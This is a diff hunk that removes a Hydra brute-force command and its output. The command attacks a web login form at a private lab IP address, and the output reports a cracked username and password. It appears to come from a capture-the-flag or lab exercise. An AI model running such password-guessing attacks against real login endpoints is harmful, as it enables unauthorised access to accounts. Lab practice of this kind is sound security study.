@@ -1,9 +1,0 @@
- hydra -l james -P passCombi.txt 10.10.248.119 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -t 64 -I
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-20 20:20:43
-[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 64 tasks per 1 server, overall 64 tasks, 180 login tries (l:1/p:180), ~3 tries per task
-[DATA] attacking http-post-form://10.10.248.119:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
-[STATUS] 64.00 tries/min, 64 tries in 00:01h, 116 to do in 00:02h, 64 active
-[80][http-post-form] host: 10.10.248.119   login: james   password: blue7
